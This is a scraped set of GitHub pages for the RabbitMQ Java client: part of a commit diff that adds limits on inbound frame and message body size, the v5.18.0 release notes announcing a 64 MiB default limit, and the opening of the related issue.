|  |  |  |
|  |  | this.\_channel0 = createChannel0(); |
|  |  |  |
|  |  | this.\_channelManager = null; |
| Expand All | | @@ -257,6 +259,7 @@ public AMQConnection(ConnectionParams params, FrameHandler frameHandler, Metrics |
|  |  | this.errorOnWriteListener = params.getErrorOnWriteListener() != null ? params.getErrorOnWriteListener() : |
|  |  | (connection, exception) -> { throw exception; }; // we just propagate the exception for non-recoverable connections |
|  |  | this.workPoolTimeout = params.getWorkPoolTimeout(); |
|  |  | this.maxInboundMessageBodySize = params.getMaxInboundMessageBodySize(); |
|  |  | } |
|  |  |  |
|  |  | AMQChannel createChannel0() { |
| Expand Down  Expand Up | | @@ -1202,4 +1205,8 @@ public boolean willCheckRpcResponseType() { |
|  |  | public TrafficListener getTrafficListener() { |
|  |  | return trafficListener; |
|  |  | } |
|  |  |  |
|  |  | int getMaxInboundMessageBodySize() { |
|  |  | return maxInboundMessageBodySize; |
|  |  | } |
|  |  | } |

20 changes: 19 additions & 1 deletion

20
[src/main/java/com/rabbitmq/client/impl/AbstractFrameHandlerFactory.java](#diff-956983c207dcd76844a361c9d33507646b62fcb1edf4968ba76b2261c33a9ca3 "src/main/java/com/rabbitmq/client/impl/AbstractFrameHandlerFactory.java")

Show comments

[View file](/rabbitmq/rabbitmq-java-client/blob/714aae602dcae6cb4b53cadf009323ebac313cc8/src/main/java/com/rabbitmq/client/impl/AbstractFrameHandlerFactory.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,3 +1,18 @@ |
|  |  | // Copyright (c) 2016-2023 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // |
|  |  | // This software, the RabbitMQ Java client library, is triple-licensed under the |
|  |  | // Mozilla Public License 2.0 ("MPL"), the GNU General Public License version 2 |
|  |  | // ("GPL") and the Apache License version 2 ("ASL"). For the MPL, please see |
|  |  | // LICENSE-MPL-RabbitMQ. For the GPL, please see LICENSE-GPL2. For the ASL, |
|  |  | // please see LICENSE-APACHE2. |
|  |  | // |
|  |  | // This software is distributed on an "AS IS" basis, WITHOUT WARRANTY OF ANY KIND, |
|  |  | // either express or implied. See the LICENSE file for specific language governing |
|  |  | // rights and limitations of this software. |
|  |  | // |
|  |  | // If you have any questions regarding licensing, please contact us at |
|  |  | // info@rabbitmq.com. |
|  |  |  |
|  |  | package com.rabbitmq.client.impl; |
|  |  |  |
|  |  | import com.rabbitmq.client.SocketConfigurator; |
| Expand All | | @@ -10,10 +25,13 @@ public abstract class AbstractFrameHandlerFactory implements FrameHandlerFactory |
|  |  | protected final int connectionTimeout; |
|  |  | protected final SocketConfigurator configurator; |
|  |  | protected final boolean ssl; |
|  |  | protected final int maxInboundMessageBodySize; |
|  |  |  |
|  |  | protected AbstractFrameHandlerFactory(int connectionTimeout, SocketConfigurator configurator, boolean ssl) { |
|  |  | protected AbstractFrameHandlerFactory(int connectionTimeout, SocketConfigurator configurator, |
|  |  | boolean ssl, int maxInboundMessageBodySize) { |
|  |  | this.connectionTimeout = connectionTimeout; |
|  |  | this.configurator = configurator; |
|  |  | this.ssl = ssl; |
|  |  | this.maxInboundMessageBodySize = maxInboundMessageBodySize; |
|  |  | } |
|  |  | } |

20 changes: 16 additions & 4 deletions

20
[src/main/java/com/rabbitmq/client/impl/CommandAssembler.java](#diff-61a80909ae65e4ec3ef1075d422ab4cb704cf5ac0c7f2bb266eee2c014d1e5e8 "src/main/java/com/rabbitmq/client/impl/CommandAssembler.java")

Show comments

[View file](/rabbitmq/rabbitmq-java-client/blob/714aae602dcae6cb4b53cadf009323ebac313cc8/src/main/java/com/rabbitmq/client/impl/CommandAssembler.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | // Copyright (c) 2007-2020 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // Copyright (c) 2007-2023 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // |
|  |  | // This software, the RabbitMQ Java client library, is triple-licensed under the |
|  |  | // Mozilla Public License 2.0 ("MPL"), the GNU General Public License version 2 |
| Expand All | | @@ -21,6 +21,7 @@ |
|  |  |  |
|  |  | import com.rabbitmq.client.AMQP; |
|  |  | import com.rabbitmq.client.UnexpectedFrameError; |
|  |  | import static java.lang.String.format; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Class responsible for piecing together a command from a series of {@link Frame}s. |
| Expand Down  Expand Up | | @@ -52,12 +53,16 @@ private enum CAState { |
|  |  | /\*\* No bytes of content body not yet accumulated \*/ |
|  |  | private long remainingBodyBytes; |
|  |  |  |
|  |  | public CommandAssembler(Method method, AMQContentHeader contentHeader, byte[] body) { |
|  |  | private final int maxBodyLength; |
|  |  |  |
|  |  | public CommandAssembler(Method method, AMQContentHeader contentHeader, byte[] body, |
|  |  | int maxBodyLength) { |
|  |  | this.method = method; |
|  |  | this.contentHeader = contentHeader; |
|  |  | this.bodyN = new ArrayList<byte[]>(2); |
|  |  | this.bodyN = new ArrayList<>(2); |
|  |  | this.bodyLength = 0; |
|  |  | this.remainingBodyBytes = 0; |
|  |  | this.maxBodyLength = maxBodyLength; |
|  |  | appendBodyFragment(body); |
|  |  | if (method == null) { |
|  |  | this.state = CAState.EXPECTING\_METHOD; |
| Expand Down  Expand Up | | @@ -99,7 +104,14 @@ private void consumeMethodFrame(Frame f) throws IOException { |
|  |  | private void consumeHeaderFrame(Frame f) throws IOException { |
|  |  | if (f.type == AMQP.FRAME\_HEADER) { |
|  |  | this.contentHeader = AMQImpl.readContentHeaderFrom(f.getInputStream()); |
|  |  | this.remainingBodyBytes = this.contentHeader.getBodySize(); |
|  |  | long bodySize = this.contentHeader.getBodySize(); |
|  |  | if (bodySize >= this.maxBodyLength) { |
|  |  | throw new IllegalStateException(format( |
|  |  | "Message body is too large (%d), maximum size is %d", |
|  |  | bodySize, this.maxBodyLength |
|  |  | )); |
|  |  | } |
|  |  | this.remainingBodyBytes = bodySize; |
|  |  | updateContentBodyState(); |
|  |  | } else { |
|  |  | throw new UnexpectedFrameError(f, AMQP.FRAME\_HEADER); |
| Expand Down | |  |

12 changes: 11 additions & 1 deletion

12
[src/main/java/com/rabbitmq/client/impl/ConnectionParams.java](#diff-2a0c4c02d92c0f927098f0076b3c175f0814a46a246be57968c212c1aaa3fc1f "src/main/java/com/rabbitmq/client/impl/ConnectionParams.java")

Show comments

[View file](/rabbitmq/rabbitmq-java-client/blob/714aae602dcae6cb4b53cadf009323ebac313cc8/src/main/java/com/rabbitmq/client/impl/ConnectionParams.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | // Copyright (c) 2007-2020 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // Copyright (c) 2007-2023 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // |
|  |  | // This software, the RabbitMQ Java client library, is triple-licensed under the |
|  |  | // Mozilla Public License 2.0 ("MPL"), the GNU General Public License version 2 |
| Expand Down  Expand Up | | @@ -64,6 +64,8 @@ public class ConnectionParams { |
|  |  |  |
|  |  | private CredentialsRefreshService credentialsRefreshService; |
|  |  |  |
|  |  | private int maxInboundMessageBodySize; |
|  |  |  |
|  |  | public ConnectionParams() {} |
|  |  |  |
|  |  | public CredentialsProvider getCredentialsProvider() { |
| Expand Down  Expand Up | | @@ -297,4 +299,12 @@ public void setCredentialsRefreshService(CredentialsRefreshService credentialsRe |
|  |  | public CredentialsRefreshService getCredentialsRefreshService() { |
|  |  | return credentialsRefreshService; |
|  |  | } |
|  |  |  |
|  |  | public int getMaxInboundMessageBodySize() { |
|  |  | return maxInboundMessageBodySize; |
|  |  | } |
|  |  |  |
|  |  | public void setMaxInboundMessageBodySize(int maxInboundMessageBodySize) { |
|  |  | this.maxInboundMessageBodySize = maxInboundMessageBodySize; |
|  |  | } |
|  |  | } |

11 changes: 9 additions & 2 deletions

11
[src/main/java/com/rabbitmq/client/impl/Frame.java](#diff-ed0b9c599d7d8b63dc628d1f2b2153099072fc732877267fc1a752addeb7048c "src/main/java/com/rabbitmq/client/impl/Frame.java")

Show comments

[View file](/rabbitmq/rabbitmq-java-client/blob/714aae602dcae6cb4b53cadf009323ebac313cc8/src/main/java/com/rabbitmq/client/impl/Frame.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | // Copyright (c) 2007-2022 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // Copyright (c) 2007-2023 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // |
|  |  | // This software, the RabbitMQ Java client library, is triple-licensed under the |
|  |  | // Mozilla Public License 2.0 ("MPL"), the GNU General Public License version 2 |
| Expand All | | @@ -25,6 +25,7 @@ |
|  |  | import java.util.Date; |
|  |  | import java.util.List; |
|  |  | import java.util.Map; |
|  |  | import static java.lang.String.format; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Represents an AMQP wire-protocol frame, with frame type, channel number, and payload bytes. |
| Expand Down  Expand Up | | @@ -82,7 +83,7 @@ public static Frame fromBodyFragment(int channelNumber, byte[] body, int offset, |
|  |  | \* |
|  |  | \* @return a new Frame if we read a frame successfully, otherwise null |
|  |  | \*/ |
|  |  | public static Frame readFrom(DataInputStream is) throws IOException { |
|  |  | public static Frame readFrom(DataInputStream is, int maxPayloadSize) throws IOException { |
|  |  | int type; |
|  |  | int channel; |
|  |  |  |
| Expand All | | @@ -108,6 +109,12 @@ public static Frame readFrom(DataInputStream is) throws IOException { |
|  |  |  |
|  |  | channel = is.readUnsignedShort(); |
|  |  | int payloadSize = is.readInt(); |
|  |  | if (payloadSize >= maxPayloadSize) { |
|  |  | throw new IllegalStateException(format( |
|  |  | "Frame body is too large (%d), maximum size is %d", |
|  |  | payloadSize, maxPayloadSize |
|  |  | )); |
|  |  | } |
|  |  | byte[] payload = new byte[payloadSize]; |
|  |  | is.readFully(payload); |
|  |  |  |
| Expand Down | |  |

12 changes: 8 additions & 4 deletions

12
[src/main/java/com/rabbitmq/client/impl/SocketFrameHandler.java](#diff-789e5d3b6f822fd94d8f83393059a754817405059bea5ad98d33a494af649f7f "src/main/java/com/rabbitmq/client/impl/SocketFrameHandler.java")

Show comments

[View file](/rabbitmq/rabbitmq-java-client/blob/714aae602dcae6cb4b53cadf009323ebac313cc8/src/main/java/com/rabbitmq/client/impl/SocketFrameHandler.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | // Copyright (c) 2007-2020 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // Copyright (c) 2007-2023 VMware, Inc. or its affiliates. All rights reserved. |
|  |  | // |
|  |  | // This software, the RabbitMQ Java client library, is triple-licensed under the |
|  |  | // Mozilla Public License 2.0 ("MPL"), the GNU General Public License version 2 |
| Expand Down  Expand Up | | @@ -52,22 +52,26 @@ public class SocketFrameHandler implements FrameHandler { |
|  |  | /\*\* Socket's outputstream - data to the broker - synchronized on \*/ |
|  |  | private final DataOutputStream \_outputStream; |
|  |  |  |
|  |  | private final int maxInboundMessageBodySize; |
|  |  |  |
|  |  | /\*\* Time to linger before closing the socket forcefully. \*/ |
|  |  | public static final int SOCKET\_CLOSING\_TIMEOUT = 1; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @param socket the socket to use |
|  |  | \*/ |
|  |  | public SocketFrameHandler(Socket socket) throws IOException { |
|  |  | this(socket, null); |
|  |  | this(socket, null, Integer.MAX\_VALUE); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @param socket the socket to use |
|  |  | \*/ |
|  |  | public SocketFrameHandler(Socket socket, ExecutorService shutdownExecutor) throws IOException { |
|  |  | public SocketFrameHandler(Socket socket, ExecutorService shutdownExecutor, |
|  |  | int maxInboundMessageBodySize) throws IOException { |
|  |  | \_socket = socket; |
|  |  | \_shutdownExecutor = shutdownExecutor; |
|  |  | this.maxInboundMessageBodySize = maxInboundMessageBodySize; |
|  |  |  |
|  |  | \_inputStream = new DataInputStream(new BufferedInputStream(socket.getInputStream())); |
|  |  | \_outputStream = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream())); |
| Expand Down  Expand Up | | @@ -181,7 +185,7 @@ public void initialize(AMQConnection connection) { |
|  |  | @Override |
|  |  | public Frame readFrame() throws IOException { |
|  |  | synchronized (\_inputStream) { |
|  |  | return Frame.readFrom(\_inputStream); |
|  |  | return Frame.readFrom(\_inputStream, this.maxInboundMessageBodySize); |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `714aae6`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frabbitmq%2Frabbitmq-java-client%2Fcommit%2F714aae602dcae6cb4b53cadf009323ebac313cc8) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_103f3d57_20250111_012752.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frabbitmq%2Frabbitmq-java-client%2Freleases%2Ftag%2Fv5.18.0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frabbitmq%2Frabbitmq-java-client%2Freleases%2Ftag%2Fv5.18.0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=rabbitmq%2Frabbitmq-java-client)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rabbitmq](/rabbitmq)
/
**[rabbitmq-java-client](/rabbitmq/rabbitmq-java-client)**
Public

* [Notifications](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client) You must be signed in to change notification settings
* [Fork
  577](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client)
* [Star
   1.3k](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client)

* [Code](/rabbitmq/rabbitmq-java-client/tree/v5.18.0)
* [Issues
  19](/rabbitmq/rabbitmq-java-client/issues)
* [Pull requests
  2](/rabbitmq/rabbitmq-java-client/pulls)
* [Discussions](/rabbitmq/rabbitmq-java-client/discussions)
* [Actions](/rabbitmq/rabbitmq-java-client/actions)
* [Security](/rabbitmq/rabbitmq-java-client/security)
* [Insights](/rabbitmq/rabbitmq-java-client/pulse)

Additional navigation options

* [Code](/rabbitmq/rabbitmq-java-client/tree/v5.18.0)
* [Issues](/rabbitmq/rabbitmq-java-client/issues)
* [Pull requests](/rabbitmq/rabbitmq-java-client/pulls)
* [Discussions](/rabbitmq/rabbitmq-java-client/discussions)
* [Actions](/rabbitmq/rabbitmq-java-client/actions)
* [Security](/rabbitmq/rabbitmq-java-client/security)
* [Insights](/rabbitmq/rabbitmq-java-client/pulse)

1. [Releases](/rabbitmq/rabbitmq-java-client/releases)
2. [v5.18.0](/rabbitmq/rabbitmq-java-client/releases/tag/v5.18.0)

# v5.18.0

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/rabbitmq/rabbitmq-java-client/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v5.18.0)

 Loading

[View all tags](/rabbitmq/rabbitmq-java-client/tags)

![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&v=4)
[acogoluegnes](/acogoluegnes)
released this
19 Jun 09:14

·
[1316 commits](/rabbitmq/rabbitmq-java-client/compare/v5.18.0...main)
to main
since this release

[v5.18.0](/rabbitmq/rabbitmq-java-client/tree/v5.18.0)

[`dcc284e`](/rabbitmq/rabbitmq-java-client/commit/dcc284ee1b199057a1094055b7eac597539c9942)

# Changes between 5.17.0 and 5.18.0

This is a minor release with usability improvements and dependency upgrades. It is compatible with 5.17.x. All users of the 5.x.x series are encouraged to upgrade.

Inbound message size is now enforced, with default limit being 64 MiB.

Thanks to [@JHahnHRO](https://github.com/JHahnHRO) and Sérgio Faria ([@sergio91pt](https://github.com/sergio91pt)) for their contribution.

## Add ability to specify maximum message size

GitHub issue: [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)

## Do not confirmSelect more than once per channel

GitHub PR: [#1057](https://github.com/rabbitmq/rabbitmq-java-client/pull/1057)

## Make RpcClient (Auto)Closeable

GitHub issue: [#1032](https://github.com/rabbitmq/rabbitmq-java-client/issues/1032)

## Bump dependencies

GitHub issue: [#999](https://github.com/rabbitmq/rabbitmq-java-client/issues/999)

# Dependency

## Maven

```
<dependency>
  <groupId>com.rabbitmq</groupId>
  <artifactId>amqp-client</artifactId>
  <version>5.18.0</version>
</dependency>
```
## Gradle

```
compile 'com.rabbitmq:amqp-client:5.18.0'
```

### Contributors

* [![@sergio91pt](https://avatars.githubusercontent.com/u/329719?s=64&v=4)](https://github.com/sergio91pt)
* [![@JHahnHRO](https://avatars.githubusercontent.com/u/39598744?s=64&v=4)](https://github.com/JHahnHRO)

sergio91pt and JHahnHRO

 Assets
2

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_48a15bbb_20250111_012751.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frabbitmq%2Frabbitmq-java-client%2Fissues%2F1062)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frabbitmq%2Frabbitmq-java-client%2Fissues%2F1062)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=rabbitmq%2Frabbitmq-java-client)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rabbitmq](/rabbitmq)
/
**[rabbitmq-java-client](/rabbitmq/rabbitmq-java-client)**
Public

* [Notifications](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client) You must be signed in to change notification settings
* [Fork
  577](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client)
* [Star
   1.3k](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client)

* [Code](/rabbitmq/rabbitmq-java-client)
* [Issues
  19](/rabbitmq/rabbitmq-java-client/issues)
* [Pull requests
  2](/rabbitmq/rabbitmq-java-client/pulls)
* [Discussions](/rabbitmq/rabbitmq-java-client/discussions)
* [Actions](/rabbitmq/rabbitmq-java-client/actions)
* [Security](/rabbitmq/rabbitmq-java-client/security)
* [Insights](/rabbitmq/rabbitmq-java-client/pulse)

Additional navigation options

* [Code](/rabbitmq/rabbitmq-java-client)
* [Issues](/rabbitmq/rabbitmq-java-client/issues)
* [Pull requests](/rabbitmq/rabbitmq-java-client/pulls)
* [Discussions](/rabbitmq/rabbitmq-java-client/discussions)
* [Actions](/rabbitmq/rabbitmq-java-client/actions)
* [Security](/rabbitmq/rabbitmq-java-client/security)
* [Insights](/rabbitmq/rabbitmq-java-client/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frabbitmq%2Frabbitmq-java-client%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frabbitmq%2Frabbitmq-java-client%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Add ability to specify maximum message size #1062

Closed

[acogoluegnes](/acogoluegnes) opened this issue
Jun 14, 2023
· 8 comments
 · Fixed by [#1063](https://github.com/rabbitmq/rabbitmq-java-client/pull/1063)

Closed

# [Add ability to specify maximum message size](#top) #1062

[acogoluegnes](/acogoluegnes) opened this issue
Jun 14, 2023
· 8 comments
 · Fixed by [#1063](https://github.com/rabbitmq/rabbitmq-java-client/pull/1063)

Assignees
[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&v=4)](/acogoluegnes)

Labels
[breaking-change](/rabbitmq/rabbitmq-java-client/labels/breaking-change)
[usability](/rabbitmq/rabbitmq-java-client/labels/usability)

Milestone
[5.18.0](/rabbitmq/rabbitmq-java-client/milestone/85 "5.18.0")

## Comments

[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=80&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

Copy link

Contributor

### **[acogoluegnes](/acogoluegnes)** commented [Jun 14, 2023](#issue-1756399738)

| *No description provided.* |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)
[acogoluegnes](/acogoluegnes)
added
the
[usability](/rabbitmq/rabbitmq-java-client/labels/usability)
label
[Jun 14, 2023](#event-9525629696)

[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)
[acogoluegnes](/acogoluegnes)
added this to the [5.18.0](/rabbitmq/rabbitmq-java-client/milestone/85) milestone
[Jun 14, 2023](#event-9525629715)

[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)
[acogoluegnes](/acogoluegnes)
self-assigned this
[Jun 14, 2023](#event-9525629764)

[![@lukebakken](https://avatars.githubusercontent.com/u/514926?s=40&v=4)](/lukebakken)
[lukebakken](/lukebakken)
mentioned this issue
[Jun 14, 2023](#ref-issue-1757306131)

[MaxMessageSize actually limits frame size
rabbitmq/rabbitmq-dotnet-client#1356](/rabbitmq/rabbitmq-dotnet-client/issues/1356)

Closed

[acogoluegnes](/acogoluegnes)
added a commit
that referenced
this issue
[Jun 15, 2023](#ref-commit-9ed45fd)
